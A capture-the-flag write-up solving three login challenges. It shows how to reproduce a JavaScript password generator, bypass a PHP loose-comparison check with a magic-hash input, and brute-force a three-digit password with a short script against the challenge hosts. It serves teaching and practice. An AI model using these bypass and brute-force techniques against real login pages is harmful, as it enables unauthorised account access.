#  Login Sec
tags: web

## Description

>The university's department of Secure Login Systems has just launched three prototypes of their research projects.<br>
Maybe you can have a look at all three of them:

3 login pages are provided, with the respective code running them.

## Solution

### Login 1

#### Code

```javascript
var http = require('http');
const crypto = require('crypto');
var url = require('url');
var fs = require('fs');

var _0x86d1=["\x68\x65\x78","\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"];

function generatePart1() {
    return
         {
             x: crypto[_0x86d1[1]](8)

         }[x].toString(_0x86d1[0]);
}
function generatePart2() {
    return [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];
}

http.createServer(function (req, res) {
    res.writeHead(200, {'Content-Type': 'text/html'});
    passwd = generatePart1() + generatePart2();
    var url_content = url.parse(req.url, true);

    if (passwd == url_content.query.passwd) {
       res.write(fs.readFileSync('flag.txt', 'utf8'));
    } else {
        res.write('<html><body><form method="get"><input type="text" name="passwd" value="password"><input type="submit" value="login" /></form></body></html>');
    }
    res.end();
}).listen(8888);
```

#### Solution

Since we have the source code that generates the password we can simply execute it without the http server. I also included *request* to automatically retrieve the flag sending the password to the login page:

```javascript
var request = require("request");
const crypto = require('crypto');

var _0x86d1=["\x68\x65\x78","\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"];

function generatePart1() {
    return
         {
             x: crypto[_0x86d1[1]](8)

         }[x].toString(_0x86d1[0]);
}
function generatePart2() {
    return [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];
}

passwd = generatePart1() + generatePart2();

var baseurl = "http://login1.uni.hctf.fun/?passwd=";
request(baseurl + passwd, function(error, response, result) {
  console.log(result);
});
```

It prints the following result: `flag{W0w_1_gu3ss_th1s`


### Login 2

#### Code

```php
<?php
include("flag.php");
if (isset($_GET['passwd'])) {
        if (hash("md5", $_GET['passwd']) == '0e514198428367523082236389979035')        {
                echo $flag;
        }
} else {
    echo '<html><body><form method="get"><input type="text" name="passwd" value="password"><input type="submit" value="login" /></form></body></html>';
}
?>
```

#### Solution

The task ask us to find a string which md5 hash is equal to `0e514198428367523082236389979035`. Searching the hash online didn't provide any result.

We need to find another path. After looking better at the code I found a weakness that we can probably exploit: The comparison in the if condition is done with `==` instead of `===`. This mean that the comparison returns true also if both strings are scientific number, so I just need to find a string which hash is like: "`0e` + some digits".
A better explanation of this attack is provided in [this writeup](https://github.com/bl4de/ctf/blob/master/2017/HackDatKiwi_CTF_2017/md5games1/md5games1.md) we found. The writeup also provide the string we need: `0e215962017`. The string was found just with bruteforce, if you are interested in the script check out the writeup.

If we insert the string in the login page it prints: `_t0_be_4_pr3tty_`.


### Login 3

#### Code

```python
from flask import Flask, request, send_from_directory

app = Flask(__name__)

passwd = open("/opt/passwd.txt").read()
flag = open("/opt/flag.txt").read()


@app.route('/')
def index():
    userpw = request.args.get("passwd", "")
    if userpw == passwd:
        return flag, 200, {"Content-Type": "text/plain"}
    else:
        return '<html><body><form method="get"><input type="text" name="passwd" value="password"><input type="submit" value="login" /></form></body></html>'


if __name__ == '__main__':
    assert(len(passwd) == 3)
    assert(passwd.isdigit())
    app.run()
```

#### Solution

The password is just 3 digit because of the two following asserts:
```python
  assert(len(passwd) == 3)
  assert(passwd.isdigit())
```

so there are only 1000 possible passwords, from *000* to *999*, so just bruteforce it!

```python
import urllib2

baseurl = "http://login3.uni.hctf.fun/?passwd="
for number in range(0, 999):
    pwd = "0"*(3-len(str(number))) + str(number)
    content = urllib2.urlopen(baseurl + pwd).read()
    if content.find("<input type") == -1:
        print content
        break
```

The script outputs: `4_d4mn_l0ng_fl4g}` (using the password `007`).

Finally combining the three partial flags gives the complete flag: `flag{W0w_1_gu3ss_th1s_t0_be_4_pr3tty_4_d4mn_l0ng_fl4g}`

Completed!
